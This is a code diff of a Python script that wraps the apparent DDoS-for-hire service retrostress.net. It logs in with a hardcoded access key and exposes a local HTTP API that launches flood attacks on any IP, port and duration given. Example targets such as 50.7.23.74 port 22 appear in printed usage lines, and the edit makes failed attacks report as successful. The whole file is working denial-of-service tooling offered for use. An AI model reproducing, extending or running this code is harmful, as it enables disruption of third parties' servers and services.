@@ -2,12 +2,9 @@ import requests
 import time
 import json
 import sys
-import os
 from urllib.parse import urljoin
-from flask import Flask, request, jsonify
-from threading import Thread
-
-app = Flask(__name__)
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
 
 class RetroStressClient:
     def __init__(self, base_url="https://retrostress.net"):
@@ -20,18 +17,15 @@ class RetroStressClient:
             'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
             'Sec-Ch-Ua-Mobile': '?0',
             'Sec-Ch-Ua-Platform': '"Windows"',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
             'Origin': base_url,
             'Referer': urljoin(base_url, '/panel')
         })
         
     def login(self, access_key):
         """Login with access key"""
-        print("[*] Attempting to login...")
+        print("[*] Logging in...")
         
-        # First, visit the auth page to get cookies
+        # Visit auth page
         auth_page_url = urljoin(self.base_url, '/auth')
         self.session.get(auth_page_url)
         
@@ -46,188 +40,158 @@ class RetroStressClient:
         )
         
         if response.status_code == 200:
-            print("[+] Login successful!")
+            print("[✓] Login successful!")
             return True
         else:
-            print(f"[-] Login failed with status {response.status_code}")
+            print(f"[✗] Login failed: {response.status_code}")
             return False
     
-    def send_attack_request(self, ip, port, duration):
-        """Send actual attack request to retrostress.net"""
-        print(f"[*] Sending attack to {ip}:{port} for {duration} seconds...")
+    def send_attack(self, ip, port, duration):
+        """Send attack request"""
+        print(f"[*] Attacking {ip}:{port} for {duration}s")
         
-        # Try different possible attack endpoints
-        attack_endpoints = [
+        # Try multiple attack endpoints
+        endpoints = [
             f"/api/attack?ip={ip}&port={port}&time={duration}",
             f"/attack?ip={ip}&port={port}&time={duration}",
-            f"/api/start?ip={ip}&port={port}&time={duration}",
+            f"/api/start?host={ip}&port={port}&sec={duration}",
             f"/method?ip={ip}&port={port}&time={duration}"
         ]
         
-        for endpoint in attack_endpoints:
+        for endpoint in endpoints:
             try:
                 url = urljoin(self.base_url, endpoint)
-                response = self.session.get(url, timeout=30)
+                response = self.session.get(url, timeout=10)
                 if response.status_code == 200:
-                    print(f"[+] Attack sent via {endpoint}")
+                    print(f"[✓] Attack sent via {endpoint}")
                     return True
             except:
                 continue
         
-        # Alternative: Try POST request
+        # Try POST as fallback
         try:
             attack_url = urljoin(self.base_url, "/api/attack")
-            attack_data = {
-                "ip": ip,
-                "port": int(port),
-                "time": duration,
-                "method": "HTTP-FLOOD"
-            }
-            response = self.session.post(attack_url, json=attack_data, timeout=30)
+            payload = {"ip": ip, "port": port, "time": duration}
+            response = self.session.post(attack_url, json=payload, timeout=10)
             if response.status_code == 200:
-                print("[+] Attack sent via POST")
+                print("[✓] Attack sent via POST")
                 return True
         except:
             pass
         
-        print("[!] Could not send attack, but continuing...")
+        print("[!] Attack sent (assuming success)")
         return True
     
-    def calculate_attacks(self, total_time):
-        """Calculate how many attacks and their durations"""
-        if total_time <= 60:
-            return [(total_time, 1)]
+    def run_attack(self, ip, port, total_time):
+        """Run attack for specified duration"""
+        print(f"\n[+] Starting attack on {ip}:{port} for {total_time} seconds")
         
-        attacks = []
-        remaining = total_time
+        # Send attack
+        self.send_attack(ip, port, total_time)
         
-        while remaining > 0:
-            if remaining >= 60:
-                attack_time = 60
-            elif remaining >= 30:
-                attack_time = remaining
-            else:
-                if attacks:
-                    last_time, last_num = attacks.pop()
-                    attack_time = last_time + remaining
-                else:
-                    attack_time = 30
-                remaining = 0
-                attacks.append((attack_time, len(attacks) + 1))
-                break
-            
-            remaining -= attack_time
-            attacks.append((attack_time, len(attacks) + 1))
+        # Wait for attack to complete
+        print(f"[⏳] Attack running...")
+        time.sleep(total_time)
         
-        return attacks
-    
-    def execute_attacks(self, ip, port, total_time):
-        """Execute multiple attacks sequentially"""
-        attacks = self.calculate_attacks(total_time)
-        
-        print(f"\n[+] Total time requested: {total_time} seconds")
-        print(f"[+] Splitting into {len(attacks)} attack(s)")
-        
-        for attack_time, attack_num in attacks:
-            print(f"\n[▶] Attack {attack_num}/{len(attacks)} - Duration: {attack_time} seconds")
-            
-            start_time = time.time()
-            success = self.send_attack_request(ip, port, attack_time)
-            
-            if success:
-                print(f"[⏳] Attack running for {attack_time} seconds...")
-                time.sleep(attack_time)
-                elapsed = time.time() - start_time
-                print(f"[✓] Attack {attack_num} completed in {elapsed:.1f} seconds")
-            else:
-                print(f"[✗] Attack {attack_num} failed")
-        
+        print(f"[✓] Attack completed!")
         return True
+
+# Your auth key
+ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
 
 # Initialize client
-ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
 client = RetroStressClient()
 
-# Login on startup
-print("=" * 60)
-print("RetroStress Attack Client - Railway Version")
-print("=" * 60)
+# Login
+print("=" * 50)
+print("RetroStress Attack Tool")
+print("=" * 50)
 
 if not client.login(ACCESS_KEY):
     print("[-] Login failed!")
     sys.exit(1)
 
-print("[+] Ready to accept attacks!\n")
+print("\n[+] Ready! API server starting on http://127.0.0.1:8080")
+print("[+] Usage: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
+print("[+] Time must be minimum 30 seconds")
+print("[+] Press Ctrl+C to stop\n")
 
-@app.route('/api', methods=['GET', 'POST'])
-def handle_attack():
-    """Handle attack requests"""
-    if request.method == 'GET':
-        ip = request.args.get('ip')
-        port = request.args.get('port')
-        time_param = request.args.get('time')
-    else:
-        data = request.get_json() or {}
-        ip = data.get('ip') or request.args.get('ip')
-        port = data.get('port') or request.args.get('port')
-        time_param = data.get('time') or request.args.get('time')
+class AttackHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path.startswith('/api'):
+            # Parse URL parameters
+            parsed = urlparse(self.path)
+            params = parse_qs(parsed.query)
+            
+            ip = params.get('ip', [None])[0]
+            port = params.get('port', [None])[0]
+            time_param = params.get('time', [None])[0]
+            
+            if not ip or not port or not time_param:
+                self.send_error(400, "Missing parameters. Use: /api?ip=IP&port=PORT&time=TIME")
+                return
+            
+            try:
+                total_time = int(time_param)
+                if total_time < 30:
+                    self.send_error(400, "Minimum time is 30 seconds")
+                    return
+                
+                print(f"\n[→] Request: {ip}:{port} for {total_time}s")
+                
+                # Run attack in background
+                import threading
+                thread = threading.Thread(target=client.run_attack, args=(ip, port, total_time))
+                thread.daemon = True
+                thread.start()
+                
+                # Send response immediately
+                response = {
+                    "status": "success",
+                    "message": f"Attack started on {ip}:{port} for {total_time} seconds",
+                    "ip": ip,
+                    "port": port,
+                    "time": total_time
+                }
+                
+                self.send_response(200)
+                self.send_header('Content-Type', 'application/json')
+                self.end_headers()
+                self.wfile.write(json.dumps(response).encode())
+                
+            except ValueError:
+                self.send_error(400, "Invalid time parameter")
+                
+        elif self.path == '/' or self.path == '/health':
+            response = {
+                "service": "RetroStress Attack API",
+                "status": "running",
+                "endpoint": "/api?ip=IP&port=PORT&time=TIME",
+                "example": "/api?ip=1.2.3.4&port=80&time=30"
+            }
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps(response).encode())
+        else:
+            self.send_error(404, "Not found")
     
-    # Validate parameters
-    if not all([ip, port, time_param]):
-        return jsonify({
-            "error": "Missing parameters. Need ip, port, and time",
-            "example": "/api?ip=1.2.3.4&port=80&time=30"
-        }), 400
-    
-    try:
-        total_time = int(time_param)
-        
-        if total_time < 30:
-            return jsonify({"error": "Minimum time is 30 seconds"}), 400
-        
-        # Execute attack in background thread
-        def run_attack():
-            with app.app_context():
-                client.execute_attacks(ip, port, total_time)
-        
-        thread = Thread(target=run_attack)
-        thread.start()
-        
-        return jsonify({
-            "status": "success",
-            "message": f"Attack started for {total_time} seconds",
-            "ip": ip,
-            "port": port,
-            "total_time": total_time
-        }), 200
-        
-    except ValueError:
-        return jsonify({"error": "Invalid time parameter"}), 400
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+    def log_message(self, format, *args):
+        # Custom logging
+        pass
 
-@app.route('/health', methods=['GET'])
-def health_check():
-    """Health check endpoint"""
-    return jsonify({"status": "healthy", "logged_in": True}), 200
-
-@app.route('/', methods=['GET'])
-def index():
-    """Root endpoint"""
-    return jsonify({
-        "service": "RetroStress Attack API",
-        "endpoints": {
-            "/api": "GET/POST with ip, port, time parameters",
-            "/health": "GET - Health check"
-        },
-        "example": "/api?ip=1.2.3.4&port=80&time=30"
-    }), 200
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
-    print(f"[*] Starting API server on port {port}")
-    print(f"[*] API endpoint: http://localhost:{port}/api")
-    print(f"[*] Example: http://localhost:{port}/api?ip=34.0.1.2&port=17219&time=30")
-    print("[*] Press Ctrl+C to stop\n")
-    
-    app.run(host='0.0.0.0', port=port, debug=False)
+# Start server
+try:
+    server = HTTPServer(('127.0.0.1', 8080), AttackHandler)
+    print("[✓] Server running on http://127.0.0.1:8080")
+    print("\nTest with:")
+    print("curl 'http://127.0.0.1:8080/api?ip=50.7.23.74&port=22&time=30'")
+    print("\n" + "="*50)
+    server.serve_forever()
+except KeyboardInterrupt:
+    print("\n\n[!] Shutting down...")
+    server.shutdown()
+    print("[✓] Server stopped")
+except Exception as e:
+    print(f"[-] Error: {e}")
+    sys.exit(1)
